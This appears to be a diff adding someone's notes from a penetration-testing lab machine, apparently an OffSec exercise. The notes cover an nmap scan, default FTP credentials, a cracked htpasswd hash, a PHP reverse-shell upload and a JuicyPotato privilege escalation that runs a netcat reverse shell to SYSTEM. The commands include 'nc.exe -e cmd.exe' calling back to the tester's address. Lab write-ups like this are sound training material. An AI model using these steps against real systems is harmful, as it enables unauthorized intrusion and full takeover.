@@ -1,0 +1,103 @@
+$ sudo nmap -sCV -p- -v -Pn --open 192.168.190.46 > AuthBy.txt
+PORT     STATE SERVICE       VERSION
+21/tcp   open  ftp           zFTPServer 6.0 build 2011-10-17
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| total 9680
+| ----------   1 root     root      5610496 Oct 18  2011 zFTPServer.exe
+| ----------   1 root     root           25 Feb 10  2011 UninstallService.bat
+| ----------   1 root     root      4284928 Oct 18  2011 Uninstall.exe
+| ----------   1 root     root           17 Aug 13  2011 StopService.bat
+| ----------   1 root     root           18 Aug 13  2011 StartService.bat
+| ----------   1 root     root         8736 Nov 09  2011 Settings.ini
+| dr-xr-xr-x   1 root     root          512 May 07 15:19 log
+| ----------   1 root     root         2275 Aug 08  2011 LICENSE.htm
+| ----------   1 root     root           23 Feb 10  2011 InstallService.bat
+| dr-xr-xr-x   1 root     root          512 Nov 08  2011 extensions
+| dr-xr-xr-x   1 root     root          512 Nov 08  2011 certificates
+|_dr-xr-xr-x   1 root     root          512 Oct 11  2025 accounts
+242/tcp  open  http          Apache httpd 2.2.21 ((Win32) PHP/5.3.8)
+| http-auth: 
+| HTTP/1.1 401 Authorization Required\x0D
+|_  Basic realm=Qui e nuce nuculeum esse volt, frangit nucem!
+|_http-server-header: Apache/2.2.21 (Win32) PHP/5.3.8
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: 401 Authorization Required
+3145/tcp open  zftp-admin    zFTPServer admin
+3389/tcp open  ms-wbt-server Microsoft Terminal Service
+| rdp-ntlm-info: 
+|   Target_Name: LIVDA
+|   NetBIOS_Domain_Name: LIVDA
+|   NetBIOS_Computer_Name: LIVDA
+|   DNS_Domain_Name: LIVDA
+|   DNS_Computer_Name: LIVDA
+|   Product_Version: 6.0.6001
+|_  System_Time: 2026-05-07T08:20:04+00:00
+| ssl-cert: Subject: commonName=LIVDA
+| Issuer: commonName=LIVDA
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha1WithRSAEncryption
+| Not valid before: 2025-10-09T17:16:18
+| Not valid after:  2026-04-10T17:16:18
+| MD5:     6bfe 7637 252b c376 89c8 e8a3 b163 9ec1
+| SHA-1:   1316 97ca 628d 4e98 83c4 af51 2537 b4f5 2e20 55fe
+|_SHA-256: f636 f2de 2782 818e c24e 8de0 e1d7 755d fb00 1a24 b174 963b 0600 d3ab b010 f0d9
+|_ssl-date: 2026-05-07T08:20:09+00:00; 0s from scanner time.
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+
+$ ftp 192.168.190.46
+cd to accounts
+Found three accounts name Offsec, anonymous, admin
+try admin:admin to ftp again, Found
+index.php
+.htpasswd
+.htaccess
+
+mget* to Kali. 
+.htpasswd found offsec:$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0
+cracked offsec:elite
+
+Found ftp in with admin:admin can upload files.
+upload php Ivan Sincek. then go browser direct to /shell.php
+get a reverse shell.
+$ rlwrap nc -nlvp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.233] from (UNKNOWN) [192.168.190.46] 49162
+SOCKET: Shell has connected! PID: 2768
+Microsoft Windows [Version 6.0.6001]
+Copyright (c) 2006 Microsoft Corporation.  All rights reserved.
+
+C:\wamp\bin\apache\Apache2.2.21>whoami
+livda\apache
+
+systeminfo
+Found Microsoftr Windows Serverr 2008 Standard Build 6001
+Google windows server 2008 standard 6001 privilege escalation
+Found MS11-046
+https://www.exploit-db.com/exploits/40564
+$ searchsploit MS11-046 -o
+Microsoft Windows (x86) - 'afd.sys' Local Privilege Escalation (MS11-046) | windows_x86/local/40564.c
+not working, cannot compile this 40564.c file
+
+whoami /priv found SeImpersonatePrivilege. Tried GodPotato, SigmaPotato no working, realise it is a x86 machine, try PrintSpoofer32.exe also no working.
+online find JuicyPotatox86.exe
+
+.\JuicyPotatox86.exe -l 1360 -p cmd.exe -a "/c c:\temp\nc.exe -e cmd.exe 192.168.45.233 4445" -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
+
+$ rlwrap nc -nlvp 4445
+listening on [any] 4445 ...
+connect to [192.168.45.233] from (UNKNOWN) [192.168.190.46] 49189
+Microsoft Windows [Version 6.0.6001]
+Copyright (c) 2006 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+##################################################################################
+JuicyPotato Abuses COM Objects/CLSID. Very flexible but requires finding a valid CLSID for that OS. more reliable for windows old OS version. 
+-c {} The CLSID: This is the most important part. A CLSID is a unique identifier for a specific COM object in Windows. JuicyPotato works by "abusing" a COM object that runs as SYSTEM.
+
+
